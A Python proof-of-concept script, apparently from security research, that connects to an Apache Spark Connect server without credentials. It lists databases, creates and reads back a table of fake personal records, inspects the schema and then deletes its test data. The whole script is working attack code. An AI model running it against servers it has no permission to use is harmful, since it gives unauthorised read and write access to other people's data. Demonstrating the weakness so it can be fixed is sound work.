"""
Attack A: Unauthenticated Plan Submission
No credentials needed - any client on the network can connect and enumerate schemas.
"""

import time
import sys
from pyspark.sql import SparkSession

def run_attack_a(host="localhost", port=15002, verbose=True):
    results = {"attack": "A", "description": "Unauthenticated plan submission"}
    t0 = time.time()

    spark = SparkSession.builder \
        .remote(f"sc://{host}:{port}") \
        .getOrCreate()

    connect_ms = (time.time() - t0) * 1000
    results["connect_ms"] = round(connect_ms, 1)

    if verbose:
        print(f"[+] Connected to Spark Connect at {host}:{port} in {connect_ms:.0f} ms")
        print(f"[+] Spark version: {spark.version}")

    # Enumerate catalogs
    databases = spark.catalog.listDatabases()
    db_names = [d.name for d in databases]
    results["databases"] = db_names
    if verbose:
        print(f"[+] Databases visible: {db_names}")

    # Create a test table to demonstrate write access
    spark.sql("CREATE DATABASE IF NOT EXISTS attack_a_test")
    spark.sql("""
        CREATE TABLE IF NOT EXISTS attack_a_test.sensitive_records (
            user_id INT,
            email STRING,
            ssn STRING
        ) USING parquet
    """)
    spark.sql("INSERT INTO attack_a_test.sensitive_records VALUES (1, 'alice@example.com', '123-45-6789')")
    spark.sql("INSERT INTO attack_a_test.sensitive_records VALUES (2, 'bob@example.com', '987-65-4321')")

    # Now read it back as an "attacker"
    rows = spark.sql("SELECT * FROM attack_a_test.sensitive_records").collect()
    results["rows_read"] = len(rows)
    results["sample_data"] = [(r.user_id, r.email, r.ssn) for r in rows]

    if verbose:
        print(f"[+] Created and read back test table with {len(rows)} rows:")
        for r in rows:
            print(f"    user_id={r.user_id}  email={r.email}  ssn={r.ssn}")

    # Enumerate all tables
    tables = spark.catalog.listTables("attack_a_test")
    results["tables"] = [t.name for t in tables]
    if verbose:
        print(f"[+] Tables in attack_a_test: {[t.name for t in tables]}")

    # Schema introspection
    schema = spark.table("attack_a_test.sensitive_records").schema
    results["schema"] = str(schema)
    if verbose:
        print(f"[+] Schema: {schema}")

    # Cleanup
    spark.sql("DROP DATABASE IF EXISTS attack_a_test CASCADE")
    spark.stop()

    results["success"] = True
    results["total_ms"] = round((time.time() - t0) * 1000, 1)
    return results

if __name__ == "__main__":
    res = run_attack_a()
    print(f"\n[RESULT] Attack A: {'SUCCEEDED' if res['success'] else 'FAILED'}")
    print(f"  Connected in {res['connect_ms']} ms, read {res['rows_read']} rows")
    print(f"  Total time: {res['total_ms']} ms")
